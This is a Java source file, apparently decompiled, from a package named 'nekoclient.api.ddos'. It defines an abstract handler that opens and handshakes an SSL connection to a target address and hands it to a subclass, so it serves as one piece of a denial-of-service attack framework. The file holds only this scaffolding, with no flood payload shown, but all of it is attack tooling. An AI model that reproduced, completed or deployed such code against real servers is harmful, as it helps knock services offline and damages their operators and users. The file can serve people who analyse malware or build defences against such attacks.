package dev.neko.nekoclient.api.ddos.impl.handler.ssl;

import dev.neko.nekoclient.api.ddos.Protocol;
import dev.neko.nekoclient.api.ddos.impl.handler.MethodHandler;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.util.Objects;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;

public abstract class SSLWriteMethodHandler implements MethodHandler {
   private static final SSLSocketFactory FACTORY = (SSLSocketFactory)SSLSocketFactory.getDefault();

   public abstract void handle(SSLSocket var1) throws IOException;

   @Override
   public void run(Protocol protocol, InetSocketAddress address) throws IOException {
      if (!Objects.equals(protocol, Protocol.TCP)) {
         throw new IllegalStateException();
      } else {
         SSLSocket socket = (SSLSocket)FACTORY.createSocket(address.getAddress(), address.getPort());
         socket.startHandshake();
         this.handle(socket);
      }
   }
}
